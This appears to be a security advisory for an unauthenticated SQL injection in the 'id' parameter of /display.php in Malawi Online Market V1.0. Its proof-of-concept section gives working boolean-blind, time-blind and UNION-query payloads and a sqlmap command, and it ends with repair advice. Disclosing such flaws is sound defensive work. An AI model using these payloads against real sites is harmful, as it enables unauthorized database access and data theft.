# sourcecodester Malawi Online Market V1.0 /display.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ Malawi Online Market

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/12097/malawi-online-market.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /display.php

## Vulnerability location:
+ 'id' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/download-code?nid=12097&title=Malawi+Online+Market)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/display.php' file of the 'Malawi Online Market' project. The reason for this issue is that attackers inject malicious code from the parameter 'id' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Malawi Online Market In PHP With Source Code", WeQi discovered a critical SQL injection vulnerability in the "/display.php" file. This vulnerability stems from insufficient user input validation of the 'id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ time-based blind
+ UNION query

## Payload:
```plain
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: home=10 & id=18 AND 1769=1769

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: home=10 & id=18 AND (SELECT 3132 FROM (SELECT(SLEEP(5)))AhAW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 20 columns
    Payload: home=10 & id=18 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176766b71,0x43734e6c56595663477a41636a6143706f6b477941724867426472434f67506a565356736a796e51,0x71716b7071),NULL,NULL,NULL,NULL,NULL-- -
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u "http://localhost/pages/display.php?id=18" --batch --level 5 --risk 2
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773108049490-6431b2c8-3a2b-41ad-a782-a7495054d480.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
